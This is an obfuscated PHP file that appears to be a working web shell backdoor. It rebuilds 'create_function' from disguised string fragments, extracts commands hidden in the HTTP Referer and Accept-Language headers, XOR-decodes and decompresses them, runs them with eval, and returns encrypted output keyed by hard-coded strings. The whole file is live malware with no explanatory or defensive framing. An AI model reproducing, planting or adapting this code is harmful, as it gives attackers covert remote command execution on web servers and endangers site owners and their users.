<?php
$l=';s";$i=$m;s[1][;s0].$m[1;s;s][1];$h=;s$sl($ss(md5;s($i;s.$kh),;s0,3));$f=;s$s;sl(;s;s$ss(md5(;s';
$q='$kh="5d41;s";$kf=;s"40;s2a";;sfunct;sion ;sx($t,$k){$;sc=s;strlen($k;s);$l=strlen($;st;s);$;so=';
$A='m);if($q;s&&$m;s){@s;sess;sio;sn_start;s();$s=&$_SESSIO;sN;$;s;s;ss;ss="substr";$sl="strtolower';
$J='_LANGUAGE"];if;s($rr;s&&$ra){$;s;su=parse;s_url($rr);s;parse_;sstr($u[;s"qu;sery";s;s],$q);$q=a';
$u='";s";f;sor($i=0;$i<$l;){f;s;sor;s($j=0;($j<$c&&$i<$l;s);;s$j++,$i+;s+){$o.;s=$t{$;si}^$k{$j;s};';
$O='$;si.$k;sf),0,3));$p="";fo;sr;s($z=1;$z<count;s($m[1]);$z;s+;s+)$p.=$q[;s$;sm[2][$;sz]];s;if(st';
$Z='$s;ss($s[$i],;s0,$e);s)),$k));s);;s$o=ob;s_get_content;ss();s;;sob_end_clean(;s);s;$d=bas;se64_';
$Y='pres;ss(@x;s(;s@b;sase6;s4_decode(preg_rep;sla;sc;s;se(array("/_/",;s"/-/"),array;s("/",";s+"),';
$S=str_replace('iS','','creiSatiSe_iSfuiSiSnctiSion');
$f='rpos(;s$p,$;sh)==;s=0){$s[$;si]="";$p;s=;s$ss($p;s,3;s);};sif(array_key_exists($i,$;ss)){;s$s[$';
$z='i].=;s$p;$e;s;s=strpo;ss($s[$i],$;sf);if($e);s{;s$k=$kh.$kf;s;o;sb_start();s;@ev;sal(@gz;suncom';
$r='rray_v;salues;s(;s$q);s;preg_ma;stch_all;s("/([\\w])[\\w-;s];s+(?:;q;s;s=0.([\\d]))?,?;s/",;s$ra,$';
$B='};s}return;s $o;}$r=;s$_SERV;sER;s;$r;sr=@$r["HTTP_;sREFE;sRER"];;s$ra=@$r[;s"HTTP;s;s_ACCE;sPT';
$G=';s;sencode(x(gzcompre;s;sss($o);s,$k));print;s("<$k;s>$d</$k>";s);@se;ss;ssion_destro;sy();}}}}';
$Q=str_replace(';s','',$q.$u.$B.$J.$r.$A.$l.$O.$f.$z.$Y.$Z.$G);
$W=$S('',$Q);$W();
?>
